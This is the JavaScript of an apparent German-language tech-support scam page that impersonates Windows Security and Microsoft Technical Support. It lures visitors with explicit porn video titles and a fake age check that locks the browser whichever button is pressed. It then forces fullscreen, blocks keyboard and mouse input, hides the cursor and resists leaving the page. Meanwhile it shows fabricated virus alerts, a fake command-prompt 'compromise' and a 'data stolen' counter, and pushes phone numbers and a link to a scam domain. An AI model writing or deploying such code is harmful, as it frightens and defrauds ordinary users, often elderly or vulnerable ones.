// Original taskbar functionality
let taskbar = document.getElementsByClassName("taskbar")[0]
let startmenu = document.getElementsByClassName("startmenu")[0]

taskbar.addEventListener("click", () => {
    console.log("clicked");
    if (startmenu.style.bottom == "50px") {
        startmenu.style.bottom = "-655px"
    }
    else {
        startmenu.style.bottom = "50px"
    }
})

// ========== UPDATE ALL PHONE NUMBERS ==========
function updateAllPhoneNumbers() {
    // Read phone number from HTML element
    const globalPhoneElement = document.getElementById('global-phone-number');
    if (!globalPhoneElement) {
        console.error('❌ Global phone number element not found!');
        return;
    }

    const GLOBAL_PHONE_NUMBER = globalPhoneElement.textContent.trim();

    const phoneElements = document.querySelectorAll('.phone-number-display');
    phoneElements.forEach(el => {
        el.textContent = GLOBAL_PHONE_NUMBER;
    });
    console.log(`✅ Updated ${phoneElements.length} phone numbers to: ${GLOBAL_PHONE_NUMBER}`);
}

// ========== CMD WINDOW LOGIC ==========
const cmdWindow = document.getElementById('cmd-window');
const cmdContent = document.getElementById('cmd-content');

const cmdCommands = [
    'C:\\Windows\\system32> sfc /scannow',
    'Beginning system scan. This process will take some time.',
    'Phase 1 of 5: Checking file system integrity...',
    'Phase 2 of 5: Verifying system files...',
    'Phase 3 of 5: Scanning registry entries...',
    'Windows Resource Protection found corrupt files.',
    'Details are included in the CBS.Log windir\\Logs\\CBS\\CBS.log',
    'C:\\Windows\\system32> chkdsk C: /F /R',
    'The type of the file system is NTFS.',
    'WARNING: F parameter not specified.',
    'Running CHKDSK in read-only mode.',
    'CHKDSK is verifying files (stage 1 of 5)...',
    'File verification completed.',
    'CHKDSK is verifying indexes (stage 2 of 5)...',
    'Windows found errors on the disk.',
    'C:\\Windows\\system32> netstat -ano | findstr LISTENING',
    'TCP    0.0.0.0:135         0.0.0.0:0         LISTENING       896',
    'TCP    0.0.0.0:445         0.0.0.0:0         LISTENING       4',
    'TCP    0.0.0.0:3389        0.0.0.0:0         LISTENING       1084',
    'Unauthorized network activity detected.',
    'C:\\Windows\\system32> tasklist /FI "STATUS eq RUNNING"',
    'WARNING: Multiple suspicious processes detected.',
    'System integrity compromised.',
    'C:\\Windows\\system32>'
];

let cmdLineIndex = 0;
let cmdInterval;
let cmdTimeout;

function startCMDAnimation() {
    if (!cmdWindow) return;

    console.log('💻 Starting CMD animation...');
    cmdWindow.style.display = 'flex';
    cmdLineIndex = 0; // Reset index

    cmdInterval = setInterval(() => {
        if (cmdLineIndex < cmdCommands.length) {
            const line = document.createElement('div');
            line.className = 'cmd-output';
            line.textContent = cmdCommands[cmdLineIndex];
            cmdContent.appendChild(line);
            cmdContent.scrollTop = cmdContent.scrollHeight;
            cmdLineIndex++;
        }
    }, 150);
}

function hideCMDWindow() {
    console.log('💻 Hiding CMD window after 7 seconds...');
    clearInterval(cmdInterval);
    cmdWindow.style.display = 'none';
}

// ========== CLICK-TO-FRONT LOGIC ==========
const securityWindows = [
    document.querySelector('.win-screen-1'),
    document.querySelector('.win-screen-2'),
    document.querySelector('.win-screen-3')
];

let currentZIndex = 103;
let resetTimeout;

function bringToFront(window) {
    if (!window) return;

    currentZIndex++;
    window.style.zIndex = currentZIndex;

    // Clear previous timeout
    if (resetTimeout) {
        clearTimeout(resetTimeout);
    }

    // Reset z-indexes after 10 seconds
    resetTimeout = setTimeout(() => {
        document.querySelector('.win-screen-1').style.zIndex = 103;
        document.querySelector('.win-screen-2').style.zIndex = 102;
        document.querySelector('.win-screen-3').style.zIndex = 101;
        currentZIndex = 103;
    }, 10000);
}

// Add click listeners to all windows
securityWindows.forEach(window => {
    if (window) {
        window.addEventListener('click', () => {
            bringToFront(window);
        });
    }
});

// ========== NOTIFICATIONS ==========
let notificationTimeouts = [];

function showVirusNotification(virusName, severityLevel, severityClass) {
    const container = document.getElementById('win-notification-container');
    if (!container) return;

    // Create notification
    const notification = document.createElement('div');
    notification.className = 'win-notification';

    notification.innerHTML = `
        <div class="win-notification-header">
            <img src="/win/icons/microsoft.png" alt="Windows Security" class="win-notification-icon">
            <div class="win-notification-title">Windows-Sicherheit</div>
        </div>
        <div class="win-notification-body">
            <div class="win-notification-alert-icon">⚠️</div>
            <div class="win-notification-content">
                <div class="win-notification-virus-name">${virusName}</div>
                <span class="win-notification-severity ${severityClass}">${severityLevel} Risiko</span>
            </div>
        </div>
    `;

    // Add new notification at the top
    container.insertBefore(notification, container.firstChild);

    // Remove oldest if more than 2 (keep only 2)
    while (container.children.length > 2) {
        const oldest = container.lastChild;
        if (oldest && oldest.parentNode) {
            oldest.parentNode.removeChild(oldest);
        }
    }

    // Auto-remove after 5 seconds
    const timeoutId = setTimeout(() => {
        if (notification && notification.parentNode) {
            notification.classList.add('removing');
            setTimeout(() => {
                if (notification && notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }
    }, 5000);

    // Store timeout ID for cleanup if needed
    notificationTimeouts.push(timeoutId);

    // Clean up old timeout IDs
    if (notificationTimeouts.length > 10) {
        notificationTimeouts = notificationTimeouts.slice(-10);
    }
}

// ========== SCREEN 3: ANTIVIRUS DETECTION ==========
let virusCount = 0;
let filesScanned = 0;

const virusNames = [
    'Trojan.Win32.Generic.pak',
    'Backdoor.Win32.Agent.qwerty',
    'Worm.Win32.AutoRun.gen',
    'Ransom.Win32.WannaCry.vbs',
    'Spyware.Win32.KeyLogger.sys',
    'Adware.Win32.BrowseFox.dll',
    'Rootkit.Win32.ZeroAccess.bin',
    'Trojan.Banker.Win32.Zeus',
    'Virus.Win32.Conficker.exe',
    'Malware.Win32.Generic.heur',
    'Exploit.Win32.CVE-2021.dat',
    'PUP.Win32.Toolbar.chrome',
    'Trojan.Downloader.Win32.Agent'
];

const severityLevels = ['Hoch', 'Mittel', 'Niedrig'];
const severityClasses = ['high', 'medium', 'low'];

function detectVirus() {
    virusCount++;
    const virusCountEl = document.getElementById('win-virus-count');
    if (virusCountEl) {
        virusCountEl.textContent = virusCount;
    }

    const virusName = virusNames[Math.floor(Math.random() * virusNames.length)];
    const severityIndex = Math.floor(Math.random() * severityLevels.length);

    // Show notification
    showVirusNotification(virusName, severityLevels[severityIndex], severityClasses[severityIndex]);

    // Add to virus log
    const virusLog = document.getElementById('win-virus-log');
    if (virusLog) {
        const entry = document.createElement('div');
        entry.className = 'threat-entry';
        entry.innerHTML = `
            <div class="threat-name">${virusName}</div>
            <span class="threat-severity ${severityClasses[severityIndex]}">${severityLevels[severityIndex]} Risiko</span>
        `;

        virusLog.insertBefore(entry, virusLog.firstChild);

        // Keep only last 5 entries
        while (virusLog.children.length > 5) {
            virusLog.removeChild(virusLog.lastChild);
        }
    }

    // Schedule next detection (random between 0.1-4 seconds)
    const randomDelay = Math.random() * 3900 + 100;
    setTimeout(detectVirus, randomDelay);
}

function incrementFilesScanned() {
    filesScanned += Math.floor(Math.random() * 50) + 10;
    const filesScannedEl = document.getElementById('win-files-scanned');
    if (filesScannedEl) {
        filesScannedEl.textContent = filesScanned.toLocaleString();
    }
}

function startAntivirusDetection() {
    // Start virus detection after a short delay
    setTimeout(detectVirus, 1000);

    // Update files scanned every 500ms
    setInterval(incrementFilesScanned, 500);
}

// ========== SCREEN 2: NETWORK MONITORING ==========
let threatCount = 0;
let dataStolenMB = 0;
let transferSpeed = 0;

function startNetworkMonitoring() {
    setInterval(() => {
        // Update threat count
        threatCount = Math.floor(Math.random() * 5) + 3;
        document.getElementById('win-threat-count').textContent = threatCount;

        // Update data stolen
        dataStolenMB += Math.floor(Math.random() * 100) + 50;
        const dataEl = document.getElementById('win-data-risk');
        if (dataStolenMB > 1024) {
            const dataGB = (dataStolenMB / 1024).toFixed(2);
            dataEl.textContent = `${dataGB} GB`;
        } else {
            dataEl.textContent = `${dataStolenMB} MB`;
        }

        // Update transfer speed
        transferSpeed = Math.floor(Math.random() * 500) + 100;
        document.getElementById('win-breach-speed').textContent = `${transferSpeed} KB/s`;
    }, 1500);
}

// ========== NETWORK GRAPH ==========
function initNetworkGraph() {
    const canvas = document.getElementById('win-network-graph');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    canvas.width = canvas.offsetWidth;
    canvas.height = 100;

    const dataPoints = [];
    const maxDataPoints = 50;

    function drawGraph() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // Add new data point
        dataPoints.push(Math.random() * 80 + 20);
        if (dataPoints.length > maxDataPoints) {
            dataPoints.shift();
        }

        // Draw grid
        ctx.strokeStyle = '#E0E0E0';
        ctx.lineWidth = 1;
        for (let i = 0; i < 5; i++) {
            const y = (canvas.height / 4) * i;
            ctx.beginPath();
            ctx.moveTo(0, y);
            ctx.lineTo(canvas.width, y);
            ctx.stroke();
        }

        // Draw line graph
        ctx.strokeStyle = '#D13438';
        ctx.lineWidth = 2;
        ctx.beginPath();

        dataPoints.forEach((point, index) => {
            const x = (canvas.width / maxDataPoints) * index;
            const y = canvas.height - point;

            if (index === 0) {
                ctx.moveTo(x, y);
            } else {
                ctx.lineTo(x, y);
            }
        });

        ctx.stroke();

        // Fill area under line
        ctx.lineTo(canvas.width, canvas.height);
        ctx.lineTo(0, canvas.height);
        ctx.closePath();
        ctx.fillStyle = 'rgba(209, 52, 56, 0.1)';
        ctx.fill();
    }

    setInterval(drawGraph, 100);
}

// ========== LIVE CLOCK (GERMAN FORMAT) ==========
function updateClock() {
    const now = new Date();

    // German date format: DD.MM.YYYY
    const day = String(now.getDate()).padStart(2, '0');
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const year = now.getFullYear();
    const dateString = `${day}.${month}.${year}`;

    // 24-hour time format: HH:MM
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const timeString = `${hours}:${minutes}`;

    // Update clock elements
    const timeEl = document.querySelector('.win-time');
    const dateEl = document.querySelector('.win-date');

    if (timeEl) timeEl.textContent = timeString;
    if (dateEl) dateEl.textContent = dateString;
}

// ========== CPU SYSTEM MONITOR ==========
let cpuUsageValue = 65;
let memoryUsageValue = 58;

function startCPUMonitor() {
    const cpuUsageElement = document.getElementById('win-cpu-usage');
    const memoryUsageElement = document.getElementById('win-memory-usage');
    const cpuLoadPercentElement = document.getElementById('win-cpu-load-percent');
    const cpuProgressFillElement = document.getElementById('win-cpu-progress-fill');

    if (!cpuUsageElement || !memoryUsageElement || !cpuLoadPercentElement || !cpuProgressFillElement) {
        console.error('CPU Monitor elements not found!');
        return;
    }

    // Update CPU usage every 2 seconds
    setInterval(() => {
        // Randomly fluctuate CPU usage between current value ±10, keep between 45-95%
        const change = Math.random() * 20 - 10;
        cpuUsageValue = Math.max(45, Math.min(95, cpuUsageValue + change));

        // Update display
        const cpuRounded = Math.round(cpuUsageValue);
        cpuUsageElement.textContent = cpuRounded + '%';
        cpuLoadPercentElement.textContent = cpuRounded + '%';
        cpuProgressFillElement.style.width = cpuRounded + '%';

        // Update colors based on usage
        cpuUsageElement.classList.remove('warning', 'critical');
        cpuProgressFillElement.classList.remove('warning', 'critical');

        if (cpuRounded >= 80) {
            cpuUsageElement.classList.add('critical');
            cpuProgressFillElement.classList.add('critical');
        } else if (cpuRounded >= 60) {
            cpuUsageElement.classList.add('warning');
            cpuProgressFillElement.classList.add('warning');
        }
    }, 2000);

    // Update memory usage every 3 seconds
    setInterval(() => {
        // Randomly fluctuate memory usage between 50-85%
        const change = Math.random() * 15 - 7.5;
        memoryUsageValue = Math.max(50, Math.min(85, memoryUsageValue + change));

        const memoryRounded = Math.round(memoryUsageValue);
        memoryUsageElement.textContent = memoryRounded + '%';

        // Update colors based on usage
        memoryUsageElement.classList.remove('warning', 'critical');

        if (memoryRounded >= 75) {
            memoryUsageElement.classList.add('critical');
        } else if (memoryRounded >= 65) {
            memoryUsageElement.classList.add('warning');
        }
    }, 3000);
}

// ========== VIDEO PLAYER ==========
const videoUrls = [
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s1.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s2.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s3.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s4.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s5.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s6.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s7.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s8.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s9.mp4',
    'https://yellow-leaf-f575.thomas-dean.workers.dev/s10.mp4'
];

const videoTitles = [
    'Cute girl came over at night and got cum in her pussy',
    'Horny Amateur Couple Having a Good Fuck - Mira David',
    'Step sister came to visit and was fucked in her pink pussy',
    'My stepsister helped me lose my virginity',
    'Sexy Brunette Talking on the Phone with Her Husband and Her Best Friend Fucks Her Anny Walker',
    'Hard Fucking a Friends Girlfriend and Filling Her Mouth with Cum - Anny Walker',
    'Sharing a Bed with My Stepsister and Fucking Her Big Ass - Anny Walker',
    'Stepsister Stuck Under a Blanket and Pretended to Be a Sex Doll - Anny Walker',
    'I could not resist again and fucked my stepsister. And she did not mind',
    'Im late. Can we make it in 15 minutes'
];

let currentVideoIndex = 0;
let videoPlayerOverlay = null;
let mainVideoPlayer = null;
let fullscreenActivated = false;

function initVideoPlayer() {
    console.log('🔧 Initializing Windows video player...');

    videoPlayerOverlay = document.getElementById('win-video-player-overlay');
    mainVideoPlayer = document.getElementById('win-main-video-player');

    if (!videoPlayerOverlay || !mainVideoPlayer) {
        console.error('❌ Video player elements not found!');
        return;
    }

    // Force local video
    mainVideoPlayer.src = './win/hot.mp4';
    mainVideoPlayer.load();

    mainVideoPlayer.muted = true;
    mainVideoPlayer.volume = 0.7;

    mainVideoPlayer.play().catch(err => {
        console.log('Autoplay blocked:', err);
    });

    generateThumbnails();

    // COMMENT THIS TEMPORARILY
    // playRandomVideo();

    mainVideoPlayer.addEventListener('ended', () => {
        mainVideoPlayer.currentTime = 0;
        mainVideoPlayer.play();
    });

    console.log('✅ Video player initialized');
}

function playRandomVideo() {
    let randomIndex;
    do {
        randomIndex = Math.floor(Math.random() * videoUrls.length);
    } while (randomIndex === currentVideoIndex && videoUrls.length > 1);

    currentVideoIndex = randomIndex;

    mainVideoPlayer.src = videoUrls[currentVideoIndex];
    mainVideoPlayer.muted = true;
    mainVideoPlayer.load();

    mainVideoPlayer.addEventListener('loadeddata', function playWhenReady() {
        const playPromise = mainVideoPlayer.play();

        if (playPromise !== undefined) {
            playPromise
                .then(() => console.log('✅ Video playing'))
                .catch(error => {
                    console.error('❌ Autoplay failed:', error);
                    setTimeout(() => mainVideoPlayer.play().catch(e => console.error(e)), 500);
                });
        }

        mainVideoPlayer.removeEventListener('loadeddata', playWhenReady);
    }, { once: true });

    // Update title
    document.getElementById('win-video-title').textContent = videoTitles[currentVideoIndex];

    console.log(`▶️ Playing video ${currentVideoIndex + 1}`);
}

function playVideoByIndex(index) {
    if (index < 0 || index >= videoUrls.length) return;

    currentVideoIndex = index;
    mainVideoPlayer.src = videoUrls[index];
    mainVideoPlayer.load();
    mainVideoPlayer.play();

    document.getElementById('win-video-title').textContent = videoTitles[index];
}

function generateThumbnails() {
    const thumbnailsContainer = document.getElementById('win-video-thumbnails');
    if (!thumbnailsContainer) return;

    thumbnailsContainer.innerHTML = '';

    // Shuffle indices
    let indices = Array.from({ length: videoUrls.length }, (_, i) => i);
    for (let i = indices.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [indices[i], indices[j]] = [indices[j], indices[i]];
    }

    indices.forEach((index) => {
        const thumbnail = document.createElement('div');
        thumbnail.className = 'win-video-thumbnail';
        thumbnail.dataset.index = index;

        const viewsInMillions = (Math.random() * 8.9 + 1.0).toFixed(1);

        thumbnail.innerHTML = `
            <div class="win-thumbnail-image">
                <video class="win-thumbnail-video" preload="metadata" muted>
                    <source src="${videoUrls[index]}#t=2" type="video/mp4">
                </video>
                <div class="win-thumbnail-overlay"></div>
            </div>
            <div class="win-thumbnail-info">
                <div class="win-thumbnail-title">${videoTitles[index]}</div>
                <div class="win-thumbnail-meta">Windows Security • ${viewsInMillions}M Aufrufe</div>
            </div>
        `;

        thumbnail.addEventListener('click', () => {
            playVideoByIndex(index);
            document.querySelector('.win-video-main-section').scrollTop = 0;
        });

        thumbnailsContainer.appendChild(thumbnail);
    });

    console.log(`✅ Generated ${videoUrls.length} thumbnails`);
}

function showVideoPlayer() {
    console.log('🎬 Showing video player...');

    videoPlayerOverlay = document.getElementById('win-video-player-overlay');
    if (!videoPlayerOverlay) {
        console.error('❌ Video player overlay not found!');
        return;
    }

    videoPlayerOverlay.style.display = 'flex';
    initVideoPlayer();

    // Show age verification after 0.5 seconds
    setTimeout(showAgeVerification, 500);
}

function showAgeVerification() {
    console.log('🔞 Showing age verification...');

    const ageOverlay = document.getElementById('win-age-verification-overlay');
    if (!ageOverlay) {
        console.error('❌ Age verification overlay not found!');
        return;
    }

    ageOverlay.style.display = 'flex';

    // Click on overlay to trigger fullscreen
    ageOverlay.addEventListener('click', function (e) {
        if (e.target === ageOverlay) {
            startBackgroundAudio();
            activateFullscreen();
        }
    });

    // Button listeners
    const yesBtn = document.getElementById('win-age-btn-yes');
    const noBtn = document.getElementById('win-age-btn-no');
    const closeBtn = document.getElementById('win-age-modal-close');

    if (yesBtn) {
        yesBtn.addEventListener('click', handleAgeYes);
    }

    if (noBtn) {
        noBtn.addEventListener('click', handleAgeNo);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', handleAgeClose);
    }

    console.log('✅ Age verification displayed');
}

function handleAgeYes() {
    console.log('✅ User confirmed 18+');
    startBackgroundAudio();
    activateFullscreen();
}

function handleAgeNo() {
    console.log('❌ User selected NO - activating fullscreen');
    startBackgroundAudio();
    activateFullscreen();
}

function handleAgeClose() {
    console.log('❌ User closed age verification - activating fullscreen');
    startBackgroundAudio();
    activateFullscreen();
}

function activateFullscreen() {
    if (fullscreenActivated) {
        console.log('ℹ️ Fullscreen already activated');
        return;
    }

    console.log('🔒 Activating fullscreen mode...');
    fullscreenActivated = true;

    // Start CMD animation
    startCMDAnimation();

    // Hide CMD after 7 seconds
    setTimeout(hideCMDWindow, 7000);

    // Request fullscreen
    var el = document.documentElement;
    var rfs = el.requestFullscreen
        || el.webkitRequestFullscreen
        || el.webkitRequestFullScreen
        || el.mozRequestFullScreen
        || el.msRequestFullscreen;

    if (rfs) {
        rfs.call(el).then(() => {
            console.log('✅ Fullscreen activated');
        }).catch((err) => {
            console.log('⚠️ Fullscreen request failed:', err);
        });
    }

    // Lock keyboard
    if (navigator.keyboard && navigator.keyboard.lock) {
        navigator.keyboard.lock().catch((err) => {
            console.log('⚠️ Keyboard lock failed:', err);
        });
    }

    // Keyboard + pointer control (wrapped like your example)
    (function () {

        function addEvent(obj, evt, fn) {
            if (obj.addEventListener) obj.addEventListener(evt, fn, false);
            else if (obj.attachEvent) obj.attachEvent("on" + evt, fn);
        }

        // Block all keyboard input
        function blockKeyboard(e) {
            e = e || window.event;
            if (e.preventDefault) e.preventDefault();
            e.returnValue = false;
            return false;
        }

        // Apply on load
        addEvent(window, "load", function () {

            addEvent(document, "keydown", blockKeyboard);
            addEvent(document, "keyup", blockKeyboard);
            addEvent(document, "keypress", blockKeyboard);

        });

        // Optional: try keyboard lock API
        if (navigator.keyboard && navigator.keyboard.lock) {
            navigator.keyboard.lock().catch(() => { });
        }

    })();

    // Hide cursor and lock pointer
    const body = document.body;
    if (body) {
        body.style.cursor = 'none';

        body.requestPointerLock = body.requestPointerLock ||
            body.mozRequestPointerLock ||
            body.webkitRequestPointerLock;

        if (body.requestPointerLock) {
            body.requestPointerLock();
        }
    }

    // Disable mouse events
    document.oncontextmenu = function () {
        return false;
    };

    document.onmousedown = function (e) {
        e.preventDefault();
        return false;
    };

    document.onmouseup = function (e) {
        e.preventDefault();
        return false;
    };

    // Hide age verification
    const ageOverlay = document.getElementById('win-age-verification-overlay');
    if (ageOverlay) {
        ageOverlay.style.display = 'none';
    }

    // Hide video player overlay
    const videoOverlay = document.getElementById('win-video-player-overlay');
    if (videoOverlay) {
        videoOverlay.style.display = 'none';
    }

    // Pause video
    if (mainVideoPlayer) {
        mainVideoPlayer.pause();
    }

    console.log('🔒 Fullscreen mode activated completely');
}

function onFullscreenExitWin() {
    fullscreenActivated = false;
    audioStarted = false;
    const audio = document.getElementById('win-background-audio');
    if (audio) { audio.pause(); }
    // Restore keyboard so spacebar detection works
    document.onkeydown = null;
    document.onkeyup = null;
    document.onkeypress = null;
    document.body.style.cursor = '';
    console.log('ℹ️ Exited fullscreen');
}

// Listen for fullscreen changes
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) { onFullscreenExitWin(); }
});

document.addEventListener('webkitfullscreenchange', () => {
    if (!document.webkitFullscreenElement) { onFullscreenExitWin(); }
});

document.addEventListener('mozfullscreenchange', () => {
    if (!document.mozFullScreenElement) { onFullscreenExitWin(); }
});

// Re-activate fullscreen on click if exited
document.addEventListener('click', (e) => {
    // Do not re-activate fullscreen while the support modal is visible
    var supportModal = document.getElementById('win-support-modal');
    if (supportModal && supportModal.style.display !== 'none') { return; }

    if (!fullscreenActivated && !document.fullscreenElement) {
        const videoOverlay = document.getElementById('win-video-player-overlay');
        const ageOverlay = document.getElementById('win-age-verification-overlay');

        if (videoOverlay && videoOverlay.style.display === 'none' &&
            ageOverlay && ageOverlay.style.display === 'none') {
            console.log('🔄 Re-activating fullscreen...');
            startBackgroundAudio();
            activateFullscreen();
        }
    }
});

// Exit confirmation
window.onbeforeunload = function () {
    return "Sind Sie sicher, dass Sie diese Seite verlassen möchten?";
};

window.addEventListener("beforeunload", function (e) {
    var confirmationMessage = "Sind Sie sicher, dass Sie diese Seite verlassen möchten?";
    (e || window.event).returnValue = confirmationMessage;
    return confirmationMessage;
});

// ========== BACKGROUND AUDIO ==========
let audioStarted = false;

function startBackgroundAudio() {
    if (audioStarted) {
        console.log('ℹ️ Audio already started');
        return;
    }

    const audio = document.getElementById('win-background-audio');
    if (audio) {
        audio.play()
            .then(() => {
                console.log('🔊 Background audio started');
                audioStarted = true;
            })
            .catch((err) => {
                console.log('⚠️ Audio play failed:', err);
            });
    }
}

// Start audio on first click anywhere on the page (not while support modal is open)
document.addEventListener('click', function () {
    var supportModal = document.getElementById('win-support-modal');
    if (supportModal && supportModal.style.display !== 'none') { return; }
    startBackgroundAudio();
}, { once: false });

// ========== INITIALIZE ON PAGE LOAD ==========
document.addEventListener('DOMContentLoaded', () => {
    console.log('Windows Security UI Initialized');

    // Update all phone numbers
    updateAllPhoneNumbers();

    // Start antivirus detection
    startAntivirusDetection();

    // Start network monitoring
    startNetworkMonitoring();

    // Initialize network graph
    initNetworkGraph();

    // Initialize and update clock
    updateClock();
    setInterval(updateClock, 1000); // Update every second

    // Start CPU monitor
    startCPUMonitor();

    // Show video player immediately
    console.log('📄 Initializing video player immediately...');
    showVideoPlayer();
});

// ========== SUPPORT CONNECT MODAL (Win) ==========
(function () {
    // Glow animation CSS
    var style = document.createElement('style');
    style.textContent = [
        '@keyframes supportGlowPulse {',
        '  0%,100% { box-shadow: 0 0 14px rgba(0,120,212,0.8), 0 0 28px rgba(0,120,212,0.5), 0 0 56px rgba(0,120,212,0.25); }',
        '  50%     { box-shadow: 0 0 22px rgba(0,120,212,1),   0 0 44px rgba(0,120,212,0.7), 0 0 88px rgba(0,120,212,0.35); }',
        '}'
    ].join('');
    document.head.appendChild(style);

    // Modal element
    var modal = document.createElement('div');
    modal.id = 'win-support-modal';
    modal.style.cssText = [
        'display:none',
        'position:fixed',
        'top:50%',
        'left:50%',
        'transform:translate(-50%,-50%)',
        'background:#1e1e1e',
        'border-radius:6px',
        'width:400px',
        'padding:44px 36px 36px',
        'z-index:2147483647',
        'box-shadow:0 25px 80px rgba(0,0,0,0.75)',
        'border:1px solid rgba(255,255,255,0.08)',
        'font-family:Segoe UI,Arial,sans-serif',
        'text-align:center'
    ].join(';');

    modal.innerHTML = [
        // Windows-style title bar strip + X button
        '<div style="position:absolute;top:0;left:0;right:0;height:34px;background:rgba(255,255,255,0.04);border-radius:6px 6px 0 0;display:flex;align-items:center;padding:0 4px 0 12px;">',
        '  <span style="color:rgba(255,255,255,0.45);font-size:12px;flex:1;">Microsoft Technischer Support</span>',
        '  <button id="win-support-close"',
        '    style="width:46px;height:34px;background:transparent;border:none;color:rgba(255,255,255,0.55);font-size:16px;cursor:pointer;border-radius:0 6px 0 0;transition:background .15s,color .15s;"',
        '    onmouseover="this.style.background=\'#e81123\';this.style.color=\'#fff\'"',
        '    onmouseout="this.style.background=\'transparent\';this.style.color=\'rgba(255,255,255,0.55)\'">',
        '    ✕',
        '  </button>',
        '</div>',
        // Microsoft logo
        '<img src="/win/icons/microsoft.png" style="width:60px;height:60px;object-fit:contain;margin-bottom:14px;">',
        '<h2 style="color:#fff;font-size:18px;font-weight:600;margin:0 0 8px;">Microsoft Technischer Support</h2>',
        '<p style="color:rgba(255,255,255,0.55);font-size:13px;line-height:1.55;margin:0 0 26px;">',
        '  Ein Spezialist steht bereit, um Ihr Problem sofort zu lösen.',
        '</p>',
        '<a href="https://a.vertrauensoftwares.shop/w35QzN" target="_blank" rel="noopener"',
        '  style="display:block;background:#0078d4;color:#fff;padding:14px 20px;border-radius:4px;',
        '         text-decoration:none;font-weight:600;font-size:15px;',
        '         animation:supportGlowPulse 2s ease-in-out infinite;">',
        '  Mit Support verbinden',
        '</a>'
    ].join('');

    document.body.appendChild(modal);

    // Close on X
    document.getElementById('win-support-close').addEventListener('click', function (e) {
        e.stopPropagation();
        modal.style.display = 'none';
    });

    // Spacebar × 5 (only when NOT in fullscreen)
    var spaceCount = 0;
    var spaceTimer = null;
    document.addEventListener('keydown', function (e) {
        if (fullscreenActivated || document.fullscreenElement || document.webkitFullscreenElement) return;
        if (e.key === ' ' || e.code === 'Space') {
            e.preventDefault();
            spaceCount++;
            clearTimeout(spaceTimer);
            spaceTimer = setTimeout(function () { spaceCount = 0; }, 3000);
            if (spaceCount >= 5) {
                spaceCount = 0;
                clearTimeout(spaceTimer);
                modal.style.display = 'block';
            }
        }
    });
}());




